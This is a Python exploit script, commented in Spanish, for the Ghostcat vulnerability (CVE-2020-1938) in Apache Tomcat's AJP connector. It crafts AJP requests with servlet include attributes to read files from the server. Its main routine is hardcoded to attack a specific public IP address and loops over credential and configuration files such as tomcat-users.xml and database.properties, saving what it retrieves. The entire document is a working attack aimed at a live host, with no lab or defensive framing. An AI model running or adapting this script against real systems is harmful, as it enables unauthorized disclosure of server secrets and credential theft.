#!/usr/bin/env python3
import socket
import struct
import ssl
import sys

def exploit_ghostcat(target, port=8009, filename="/WEB-INF/web.xml"):
    """
    Exploit CVE-2020-1938 - Ghostcat
    """
    
    # Crear payload AJP
    def prepare_ajp_request(filename):
        # Header AJP
        ajp_header = b"\x12\x34"
        
        # Forward request
        method = b"\x02"  # GET
        protocol = b"HTTP/1.1\x00"
        req_uri = b"/index.txt\x00"
        remote_addr = b"127.0.0.1\x00"
        remote_host = b"localhost\x00"
        server_name = target.encode() + b"\x00"
        server_port = struct.pack(">H", 80)
        is_ssl = b"\x00"
        
        # Headers
        num_headers = b"\x00\x00"  # Sin headers normales
        
        # Attributes para file disclosure
        attributes = b""
        
        # javax.servlet.include.request_uri
        attributes += b"\x0a"  # req_attribute
        attributes += struct.pack(">H", len("javax.servlet.include.request_uri"))
        attributes += b"javax.servlet.include.request_uri"
        attributes += b"\x00"
        attributes += struct.pack(">H", len("index"))
        attributes += b"index"
        attributes += b"\x00"
        
        # javax.servlet.include.path_info
        attributes += b"\x0a"  # req_attribute
        attributes += struct.pack(">H", len("javax.servlet.include.path_info"))
        attributes += b"javax.servlet.include.path_info"
        attributes += b"\x00"
        attributes += struct.pack(">H", len(filename))
        attributes += filename.encode()
        attributes += b"\x00"
        
        # javax.servlet.include.servlet_path
        attributes += b"\x0a"  # req_attribute
        attributes += struct.pack(">H", len("javax.servlet.include.servlet_path"))
        attributes += b"javax.servlet.include.servlet_path"
        attributes += b"\x00"
        attributes += struct.pack(">H", len("/"))
        attributes += b"/"
        attributes += b"\x00"
        
        attributes += b"\xff"  # End of attributes
        
        # Construir mensaje completo
        message = method + protocol + req_uri + remote_addr + remote_host + server_name + server_port + is_ssl + num_headers + attributes
        
        # Añadir longitud del mensaje
        full_message = ajp_header + struct.pack(">H", len(message)) + message
        
        return full_message
    
    try:
        # Conectar al servicio AJP
        print(f"[+] Conectando a {target}:{port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, port))
        
        # Enviar payload
        payload = prepare_ajp_request(filename)
        print(f"[+] Enviando payload para leer: {filename}")
        sock.send(payload)
        
        # Recibir respuesta
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        
        # Parsear respuesta
        if len(response) > 4:
            # Extraer contenido del archivo
            content_start = response.find(b"\x03")  # Send Body Chunk
            if content_start != -1:
                content_length = struct.unpack(">H", response[content_start+1:content_start+3])[0]
                file_content = response[content_start+3:content_start+3+content_length]
                
                print(f"[+] Archivo {filename} leído exitosamente!")
                print("="*50)
                print(file_content.decode('utf-8', errors='ignore'))
                print("="*50)
                
                # Guardar archivo
                output_filename = filename.split("/")[-1]
                with open(output_filename, "wb") as f:
                    f.write(file_content)
                print(f"[+] Archivo guardado como: {output_filename}")
            else:
                print("[-] No se pudo extraer el contenido del archivo")
                print(f"Respuesta cruda: {response[:500]}...")
        else:
            print("[-] Respuesta vacía o inválida")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

def main():
    target = "189.254.143.102"
    
    # Archivos interesantes para leer
    files_to_read = [
        "/WEB-INF/web.xml",
        "/conf/tomcat-users.xml", 
        "/conf/server.xml",
        "/WEB-INF/classes/application.properties",
        "/WEB-INF/classes/database.properties"
    ]
    
    print("=== EXPLOIT GHOSTCAT (CVE-2020-1938) ===")
    print(f"Objetivo: {target}")
    
    for file in files_to_read:
        print(f"\n[+] Intentando leer: {file}")
        exploit_ghostcat(target, 8009, file)

if __name__ == "__main__":
    main()